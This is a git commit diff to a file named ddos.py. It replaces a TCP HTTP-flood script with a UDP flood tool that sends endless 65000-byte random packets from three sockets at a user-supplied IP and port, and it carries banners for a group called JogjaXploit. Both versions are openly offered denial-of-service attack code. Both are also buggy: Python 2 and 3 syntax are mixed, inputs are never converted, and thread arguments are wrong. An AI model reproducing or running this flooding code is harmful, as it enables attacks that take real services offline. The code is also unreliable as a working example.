64d3057524960a944b38070870ef5d7e4c6f547f
rpyzz <114799661+rpyzz@users.noreply.github.com>
2023-12-09 10:35:07 +0700

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -1,37 +1,38 @@
-import threading
+import sys
+import os
+import time
 import socket
-import argparse
-
-parser = argparse.ArgumentParser(description='usage : python3 ddos.py -vct <ip> -vpt <port>')
-
-parser.add_argument('-vct', type=str, help='IP')
-parser.add_argument('-vpt', type=str, help='PORT')
-
-# Mendapatkan argumen dari baris perintah
-args = parser.parse_args()
-
-# Menggunakan argumen yang diberikan
-if args.vct is not None and args.vpt is not None:
-    attack_num = 0
-    fk = '192.161.4.1'
-    a1 = {args.vct}
-    a2 = {args.vpt}
-    byte = 90000
-    def flood():
-        while True:
-            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            soc.connect(a1)
-            soc.sendto(("GET /"+a1+" HTTP/1.1\r\n").encode("ascii"), (a1, a2))
-            soc.sendto(("Host: "+fk+"\r\n\r\n").encode("ascii"), (a1, a2))
-            global attack_num
-            attack_num += 1
-            print(f"Target Success Attacked {a1} And {a2} {attack_num}")
-            soc.close
-    def main():
-        flood()
-        for i in range(100):
-            thread = threading.Thread(victim=flood)
-            thread.start()
-
-    if __name__ == '__main__':
-         main()
+import random
+if os.name == "posix":
+    os.system('clear')
+if os.name == "nt":
+    os.system('cls')
+print("TEAM : JogjaXploit")
+print("ARMY OF MAHDI DDOS")
+print("Made By MrSanZz")
+ip = raw_input("IP : ")
+port = input("Port : ")
+size = input("Sent PerSec : ")
+try:
+    fakeip = '192.165.4.4'
+    soc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(65000)
+    soc2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes2 = random._urandom(65000)
+    soc3 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sent = 5000
+    if os.name == "posix":
+        os.system('clear')
+    if os.name == "nt":
+        os.system('cls')
+    print("\033[1;3mWait Bro.. The Satellite Cannon Is RECHARGE..")
+    time.sleep(5)
+    while True:
+        soc.sendto(bytes, (ip,port))
+        soc2.sendto(bytes2, (ip,port))
+        soc3.sendto(bytes, (ip,port))
+        sent = sent + size
+        print "\033[1;34mSending \033[1;33m%s \033[1;34mBotnet To \033[1;33m%s \033[1;34mPort \033[1;33m%s"%(sent,ip,port)
+except KeyboardInterrupt:
+    print("Keyboard Interrupt")
+    exit()
